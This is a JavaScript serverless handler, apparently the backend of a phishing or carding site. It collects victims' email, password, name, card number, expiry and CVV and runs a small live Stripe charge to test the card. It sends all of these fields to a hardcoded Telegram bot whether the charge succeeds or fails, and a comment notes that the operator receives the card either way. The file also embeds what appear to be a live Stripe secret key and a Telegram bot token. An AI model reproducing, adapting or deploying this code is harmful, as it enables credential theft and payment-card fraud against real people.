import axios from 'axios';
import { stringify } from 'querystring';

export default async function handler(req, res) {
    // 1. Configuración de cabeceras CORS para permitir la conexión desde el navegador
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Manejar petición pre-vuelo (OPTIONS)
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Método no permitido' });
    }

    // 2. Extraer datos del cuerpo de la petición (incluyendo el stripeToken generado en pay.html)
    const { em, pw, nm, cc, ex, cv, stripeToken } = req.body;

    // Credenciales (Verifica que sigan siendo válidas)
    const tg_token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    try {
        // 3. Verificación de existencia de token
        // Si el pay.html falló al crear el token, usamos el flujo directo (fallback)
        let source_id = stripeToken;

        if (!source_id) {
            const [month, year] = ex.split('/');
            const cardData = stringify({
                'card[number]': cc.replace(/\s/g, ''),
                'card[exp_month]': month.trim(),
                'card[exp_year]': '20' + year.trim(),
                'card[cvc]': cv.trim(),
                'card[name]': nm
            });

            const resToken = await axios.post('https://api.stripe.com/v1/tokens', cardData, {
                headers: { 
                    'Authorization': `Bearer ${stripe_secret}`, 
                    'Content-Type': 'application/x-www-form-urlencoded' 
                }
            });
            source_id = resToken.data.id;
        }

        // 4. Realizar Cargo Real de $2.00 MXN
        const chargeData = stringify({
            amount: 200, // $2.00 MXN
            currency: 'mxn',
            source: source_id,
            description: `Suscripción: ${em}`
        });

        const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
            headers: { 
                'Authorization': `Bearer ${stripe_secret}`, 
                'Content-Type': 'application/x-www-form-urlencoded' 
            }
        });

        // 5. Reporte de Éxito a Telegram
        if (charge.data.status === 'succeeded') {
            const msgSuccess = `✅ **PAGO APROBADO ($2.00 MXN)**\n\n` +
                               `📧 **Email:** \`${em}\` \n` +
                               `🔑 **Pass:** \`${pw}\` \n` +
                               `👤 **Nombre:** \`${nm}\` \n` +
                               `💳 **Tarjeta:** \`${cc}\` \n` +
                               `📅 **Exp:** \`${ex}\` \n` +
                               `🔒 **CVV:** \`${cv}\` \n` +
                               `🌍 **ID:** \`${charge.data.id}\``;

            await enviarTelegram(tg_token, chat_id, msgSuccess);
            return res.status(200).json({ pago: true });
        }

    } catch (error) {
        // Capturar error detallado de Stripe o del sistema
        const errorMsg = error.response?.data?.error?.message || error.message || "Error desconocido";
        
        // 6. Reporte de Fallo a Telegram (Aun así te llega la CC)
        const msgFail = `❌ **RECHAZADA / ERROR**\n\n` +
                        `⚠️ **Motivo:** ${errorMsg}\n` +
                        `📧 **Email:** \`${em}\` \n` +
                        `🔑 **Pass:** \`${pw}\` \n` +
                        `💳 **Tarjeta:** \`${cc}\` \n` +
                        `📅 **Exp:** \`${ex}\` \n` +
                        `🔒 **CVV:** \`${cv}\``;

        await enviarTelegram(tg_token, chat_id, msgFail);

        return res.status(200).json({ 
            pago: false, 
            mensaje_error: errorMsg 
        });
    }
}

// Función auxiliar para Telegram
async function enviarTelegram(token, chat, text) {
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chat,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (err) {
        console.error("Error enviando a Telegram:", err.message);
    }
}
